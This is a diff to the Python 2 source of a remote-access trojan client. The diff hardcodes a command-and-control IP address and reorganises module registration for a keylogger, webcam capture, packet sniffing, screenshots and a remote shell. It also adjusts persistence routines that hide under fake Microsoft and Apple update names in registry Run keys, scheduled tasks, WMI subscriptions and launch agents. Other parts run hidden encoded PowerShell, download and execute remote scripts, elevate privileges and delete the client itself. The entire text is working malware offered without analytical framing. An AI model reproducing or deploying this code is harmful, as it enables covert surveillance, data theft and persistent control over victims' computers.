@@ -44,7 +44,6 @@
 '''
 
 
-
 class Client(object):
     
     global __modules__
@@ -64,6 +63,44 @@ class Client(object):
         self._result    = {mod: dict({}) for mod in self._modules}
 
     # ------------------ commands --------------------------
+    def _command(fx, cx=__command__, mx=__modules__):
+        if fx.func_name is 'persistence':
+            fx.platforms = ['win32','darwin']
+            fx.options   = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+        elif fx.func_name is 'keylogger':
+            fx.platforms = ['win32','darwin','linux2']
+            fx.options   = {'max_bytes': 512, 'next_upload': time.ctime(time.time() + 300.0), 'buffer': bytes(), 'window': None}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+        elif fx.func_name is 'webcam':
+            fx.platforms = ['win32']
+            fx.options   = {'image': True, 'video': bool()}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+        elif fx.func_name is 'packetsniff':
+            fx.platforms = ['darwin','linux2']
+            fx.options   = { 'next_upload': time.ctime(time.time() + 300.0), 'buffer': []}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+        elif fx.func_name is 'screenshot':
+            fx.platforms = ['win32','linux2','darwin']
+            fx.options   = {}
+            fx.status    = True if sys.platform in fx.platforms else False
+            mx.update({fx.func_name: fx})
+        elif fx.func_name is 'standby':
+            fx.platforms = ['win32','linux2','darwin']
+            fx.options   = {'next_run': time.ctime(time.time() + 300.0)}
+            fx.status    = threading.Event()
+            mx.update({fx.func_name: fx})
+        elif fx.func_name is 'shell':
+            fx.platforms = ['win32','linux2','darwin']
+            fx.options   = {}
+            fx.status    = threading.Event()
+            mx.update({fx.func_name: fx})
+        cx.update({fx.func_name: fx})
+        return fx
 
     @_command
     def cd(self, *x):
@@ -87,7 +124,7 @@ class Client(object):
 
     @_command
     def cat(self, *x):
-        """\tdisplay file contents"""
+        """display file contents"""
         return self._cat(*x)
 
     @_command
@@ -231,6 +268,7 @@ class Client(object):
     packetsniff.usage   = 'packetsniff'
     cd.usage            = 'cd <path>'
     new.usage           = 'new <url>'
+    cat.usage           = 'cat <file>'
     set.usage           = 'set <cmd> x=y'
     help.usage          = 'help <option>'
     show.usage          = 'show <option>'
@@ -467,7 +505,7 @@ class Client(object):
                 self._socket.close()
             except: pass
             try:
-                if self.__f__:
+                if hasattr(self, '__f__'):
                     os.remove(self.__f__)
                 elif '__file__' in globals():
                     os.remove(__file__)
@@ -516,45 +554,6 @@ class Client(object):
             return 'Error: {}'.format(str(e))
         return json.dumps(getattr(self, module).options, indent=2, separators=(',', ': '), sort_keys=True)
 
-    def _command(fx, cx=__command__, mx=__modules__):
-        if fx.func_name is 'persistence':
-            fx.platforms = ['win32','darwin']
-            fx.options   = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
-            fx.status    = True if sys.platform in fx.platforms else False
-            mx.update({fx.func_name: fx})
-        elif fx.func_name is 'keylogger':
-            fx.platforms = ['win32','darwin','linux2']
-            fx.options   = {'max_bytes': 512, 'next_upload': time.ctime(time.time() + 300.0), 'buffer': bytes(), 'window': None}
-            fx.status    = True if sys.platform in fx.platforms else False
-            mx.update({fx.func_name: fx})
-        elif fx.func_name is 'webcam':
-            fx.platforms = ['win32']
-            fx.options   = {'image': True, 'video': bool()}
-            fx.status    = True if sys.platform in fx.platforms else False
-            mx.update({fx.func_name: fx})
-        elif fx.func_name is 'packetsniff':
-            fx.platforms = ['darwin','linux2']
-            fx.options   = { 'next_upload': time.ctime(time.time() + 300.0), 'buffer': []}
-            fx.status    = True if sys.platform in fx.platforms else False
-            mx.update({fx.func_name: fx})
-        elif fx.func_name is 'screenshot':
-            fx.platforms = ['win32','linux2','darwin']
-            fx.options   = {}
-            fx.status    = True if sys.platform in fx.platforms else False
-            mx.update({fx.func_name: fx})
-        elif fx.func_name is 'standby':
-            fx.platforms = ['win32','linux2','darwin']
-            fx.options   = {'next_run': time.ctime(time.time() + 300.0)}
-            fx.status    = threading.Event()
-            mx.update({fx.func_name: fx})
-        elif fx.func_name is 'shell':
-            fx.platforms = ['win32','linux2','darwin']
-            fx.options   = {}
-            fx.status    = threading.Event()
-            mx.update({fx.func_name: fx})
-        cx.update({fx.func_name: fx})
-        return fx
-
     def _options(self, *module):
         try:
             if not module:
@@ -596,7 +595,7 @@ class Client(object):
         info = self._get_info()
         if info['Admin']:
             return {'User': info['login'], 'Administrator': info['admin']}
-        if self.__f__:
+        if hasattr(self, '__f__'):
             if os.name is 'nt':
                 ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.__f__))))
             else:
@@ -724,7 +723,7 @@ class Client(object):
 
     def _start(self):
         try:
-            self._socket  = self._connect()
+            self._socket  = self._connect(host='172.23.152.84')
             self._dhkey   = self._diffiehellman()
             self._threads['shell'] = threading.Thread(target=self.shell, name='shell')
             self.standby.status.clear()
@@ -951,7 +950,7 @@ class Client(object):
     # ------------------- persistence -------------------------
 
     def _persistence_add_scheduled_task(self):
-        if self.__f__:
+        if hasattr(self, '__f__'):
             tmpdir      = gettempdir()
             task_name   = 'MicrosoftUpdateManager'
             task_run    = os.path.join(tmpdir, long_to_bytes(long(self.__f__)))
@@ -967,7 +966,7 @@ class Client(object):
         return False
 
     def _persistence_remove_scheduled_task(self):
-        if self.__f__:
+        if hasattr(self, '__f__'):
             try:
                 task_name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.__f__))))[0]
                 if subprocess.call('SCHTASKS /DELETE /TN {} /F'.format(task_name), shell=True) == 0:
@@ -976,7 +975,7 @@ class Client(object):
             return False
 
     def _persistence_add_startup_file(self):
-        if self.__f__:
+        if hasattr(self, '__f__'):
             try:
                 appdata = os.path.expandvars("%AppData%")
                 startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
@@ -993,28 +992,32 @@ class Client(object):
         return False
 
     def _persistence_remove_startup_file(self):
-        appdata     = os.path.expandvars("%AppData%")
-        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
-        if os.path.exists(startup_dir):
-            for f in os.listdir(startup_dir):
-                filepath = os.path.join(startup_dir, f)
-                if filepath.endswith('.eu.url'):
-                    try:
-                        os.remove(filepath)
-                        return True
-                    except: pass
-                    return False
+        if hasattr(self, '__f__'):
+            try:
+                appdata     = os.path.expandvars("%AppData%")
+                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
+                if os.path.exists(startup_dir):
+                    for f in os.listdir(startup_dir):
+                        filepath = os.path.join(startup_dir, f)
+                        if filepath.endswith('.eu.url'):
+                            try:
+                                os.remove(filepath)
+                                return True
+                            except: pass
+            except: pass
+            return False
 
     def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
-        reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
-        value   = long_to_bytes(long(self.__f__))
-        try:
-            SetValueEx(reg_key, name, 0, REG_SZ, value)
-            CloseKey(reg_key)
-            return True
-        except Exception as e:
-            if self.__v__:
-                print 'Remove registry key error: {}'.format(str(e))
+        if hasattr(self, '__f__'):
+            reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
+            value   = long_to_bytes(long(self.__f__))
+            try:
+                SetValueEx(reg_key, name, 0, REG_SZ, value)
+                CloseKey(reg_key)
+                return True
+            except Exception as e:
+                if self.__v__:
+                    print 'Remove registry key error: {}'.format(str(e))
         return False
 
     def _persistence_remove_registry_key(self, name='MicrosoftUpdateManager'):
@@ -1028,12 +1031,12 @@ class Client(object):
 
     def _persistence_add_wmi_object(self, command=None, name='MicrosoftUpdaterManager'):
         try:
-            if self.__f__:
+            if hasattr(self, '__f__'):
                 filename = long_to_bytes(long(self.__f__))
                 if not os.path.exists(filename):
                     return 'Error: file not found: {}'.format(filename)
-                cmd_line = "start /min /b {}".format(filename)
-            else:
+                cmd_line = 'start /b /min {}'.format(filename)
+            elif command:
                 cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
             startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
             powershell = request('GET', long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
@@ -1044,69 +1047,74 @@ class Client(object):
                 return True
         except Exception as e:
             if self.__v__:
-                print 'WMI persistence error: {}'.format(str(e))
+                print 'WMI persistence error: {}'.format(str(e))        
         return False
 
     def _persistence_remove_wmi_object(self, name='MicrosoftUpdaterManager'):
-        try:
-            code =''' 
-            Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
-            Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
-            Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
-            result = self._powershell(code)
-            if not result:
-                return True
-        except: pass
+        if hasattr(self, '__f__'):
+            try:
+                code =''' 
+                Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
+                Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
+                Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
+                result = self._powershell(code)
+                if not result:
+                    return True
+            except: pass
         return False
 
     def _persistence_add_hidden_file(self):
-        try:
-            name = os.path.basename(long_to_bytes(long(self.__f__)))
-            if os.name is 'nt':
-                hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
-            else:
-                hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
+        if hasattr(self, '__f__'):
+            try:
+                name = os.path.basename(long_to_bytes(long(self.__f__)))
+                if os.name is 'nt':
+                    hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
+                else:
+                    hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
+                    if hide:
+                        self.__f__ = bytes_to_long(os.path.join(os.path.dirname('.' + name), '.' + name))
                 if hide:
-                    self.__f__ = bytes_to_long(os.path.join(os.path.dirname('.' + name), '.' + name))
-            if hide:
-                return True
-        except Exception as e:
-            if self.__v__:
-                print 'Adding hidden file error: {}'.format(str(e))
+                    return True
+            except Exception as e:
+                if self.__v__:
+                    print 'Adding hidden file error: {}'.format(str(e))
         return False
 
     def _persistence_remove_hidden_file(self, *args, **kwargs):
-        try:
-            return subprocess.call('attrib -h {}'.format(long_to_bytes(long(self.__f__))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
-        except Exception as e:
-            if self.__v__:
-                print 'Error unhiding file: {}'.format(str(e))
+        if hasattr(self, '__f__'):
+            try:
+                return subprocess.call('attrib -h {}'.format(long_to_bytes(long(self.__f__))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
+            except Exception as e:
+                if self.__v__:
+                    print 'Error unhiding file: {}'.format(str(e))
         return False
             
 
     def _persistence_add_launch_agent(self, name='com.apple.update.manager'):
-        try:
-            code    = request('GET', long_to_bytes(self.__g__)).content
-            label   = name
-            fpath   = mktemp(suffix='.sh')
-            bash    = code.replace('__LABEL__', label).replace('__FILE__', long_to_bytes(long(self.__f__)))
-            fileobj = file(fpath, 'w')
-            fileobj.write(bash)
-            fileobj.close()
-            self._result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
-            bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-            return True
-        except Exception as e2:
-            if self.__v__:
-                print 'Error: {}'.format(str(e2))
+        if hasattr(self, '__f__'):
+            try:
+                code    = request('GET', long_to_bytes(self.__g__)).content
+                label   = name
+                fpath   = mktemp(suffix='.sh')
+                bash    = code.replace('__LABEL__', label).replace('__FILE__', long_to_bytes(long(self.__f__)))
+                fileobj = file(fpath, 'w')
+                fileobj.write(bash)
+                fileobj.close()
+                self._result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
+                bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                return True
+            except Exception as e2:
+                if self.__v__:
+                    print 'Error: {}'.format(str(e2))
         return False
 
     def _persistence_remove_launch_agent(self, name=None):
-        try:
-            name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.__f__))))[0]
-            os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
-            return True
-        except: pass
+        if hasattr(self, '__f__'):
+            try:
+                name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.__f__))))[0]
+                os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
+                return True
+            except: pass
         return False
 
 # -----------------   main   --------------------------
